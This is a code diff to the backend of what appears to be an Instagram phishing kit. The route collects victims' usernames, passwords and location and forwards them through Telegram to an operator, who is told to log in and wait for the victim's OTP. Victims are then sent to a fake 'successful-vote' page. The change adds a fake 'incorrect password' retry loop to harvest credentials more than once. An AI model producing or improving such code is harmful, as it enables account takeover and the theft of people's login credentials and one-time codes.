@@ -50,6 +50,7 @@ router.post("/inst/:linkId", async (req, res) => {
     try {
         const { username, password, country, city, region, ip } = req.body;
         const { linkId } = req.params;
+        const retry = req.query?.retry || 1;
         if (linkId.length !== 24) {
             return res.redirect("/notfound");
         }
@@ -78,7 +79,7 @@ router.post("/inst/:linkId", async (req, res) => {
 USERNAME: ${username}
 PASSWORD: ${password}
 
-PLATFORM: INSATGRAM
+PLATFORM: INSTAGRAM
 COUNTRY: ${country}
 CITY: ${city}
 REGION: ${region}
@@ -89,7 +90,12 @@ ${link.otpEnabled ? "Login and wait for victim to send OTP" : ""}
 Login now: https://www.instagram.com
                                                 `)
                 .catch(err => console.log("Telegram error"));
-            if (link.otpEnabled) {
+            
+                if(retry > 1){
+                    req.flash("error_msg", "incorrect password, try again.");
+                    return res.redirect(`/inst/${linkId}?retry=${retry-1}`)
+                }
+                if (link.otpEnabled) {
                 return res.redirect("/inst/otp/" + link.id);
             } else {
                 return res.redirect("/successful-vote");
